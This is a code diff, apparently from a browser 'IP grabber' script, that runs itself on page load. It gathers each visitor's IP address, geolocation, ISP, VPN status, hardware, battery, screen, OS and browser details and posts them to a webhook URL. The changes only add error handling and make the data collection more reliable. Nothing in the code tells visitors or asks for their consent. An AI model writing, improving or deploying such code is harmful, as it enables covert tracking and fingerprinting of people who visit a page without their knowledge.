@@ -21,7 +21,9 @@
                         vpn: isVpn ? '⚠️ YES (VPN/Proxy Detected)' : '✅ No'
                     };
                 }
-            } catch (e) {}
+            } catch (e) {
+                console.error("Provider failed:", url);
+            }
         }
         return { ip: 'Unavailable', geo: 'Unavailable', isp: 'Unknown', vpn: 'Unknown' };
     }
@@ -53,36 +55,45 @@
         };
     }
 
-    const net = await getNetworkDetails();
-    const batt = await getBattery();
-    const hw = getHardware();
-
-    const dataReport = {
-        "IP Address": net.ip,
-        "VPN Detected": net.vpn,
-        "Location": net.geo,
-        "ISP/Org": net.isp,
-        "URL": window.location.href,
-        "Referrer": document.referrer || 'Direct',
-        "Battery": batt,
-        "CPU/RAM": `${hw.cores} Cores / ${hw.ram}`,
-        "GPU": hw.gpu,
-        "Screen": `${window.screen.width}x${window.screen.height} (@${window.devicePixelRatio}x)`,
-        "OS/Platform": navigator.userAgentData ? (await navigator.userAgentData.getHighEntropyValues(['model']).then(v => v.model)) : navigator.platform,
-        "Browser": navigator.appName,
-        "Language": navigator.language,
-        "Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
-        "Cookies": navigator.cookieEnabled ? 'Yes' : 'No',
-        "Timestamp": new Date().toISOString()
-    };
-
-    const fields = Object.entries(dataReport).map(([k, v]) => ({
-        name: k,
-        value: String(v).substring(0, 1024),
-        inline: true
-    }));
-
     try {
+        const net = await getNetworkDetails();
+        const batt = await getBattery();
+        const hw = getHardware();
+
+        // Handle the UserAgentData promise carefully
+        let osPlatform = navigator.platform;
+        if (navigator.userAgentData) {
+            try {
+                const highEntropy = await navigator.userAgentData.getHighEntropyValues(['model']);
+                osPlatform = highEntropy.model || navigator.platform;
+            } catch (e) {}
+        }
+
+        const dataReport = {
+            "IP Address": net.ip,
+            "VPN Detected": net.vpn,
+            "Location": net.geo,
+            "ISP/Org": net.isp,
+            "URL": window.location.href,
+            "Referrer": document.referrer || 'Direct',
+            "Battery": batt,
+            "CPU/RAM": `${hw.cores} Cores / ${hw.ram}`,
+            "GPU": hw.gpu,
+            "Screen": `${window.screen.width}x${window.screen.height} (@${window.devicePixelRatio}x)`,
+            "OS/Platform": osPlatform,
+            "Browser": navigator.appName || "Unknown",
+            "Language": navigator.language,
+            "Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
+            "Cookies": navigator.cookieEnabled ? 'Yes' : 'No',
+            "Timestamp": new Date().toISOString()
+        };
+
+        const fields = Object.entries(dataReport).map(([k, v]) => ({
+            name: k,
+            value: String(v).substring(0, 1024),
+            inline: true
+        }));
+
         await fetch(WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -96,4 +107,7 @@
                 }]
             })
         });
-    } catch (err) {}
+    } catch (globalErr) {
+        console.error("Telemetry failed:", globalErr);
+    }
+})();
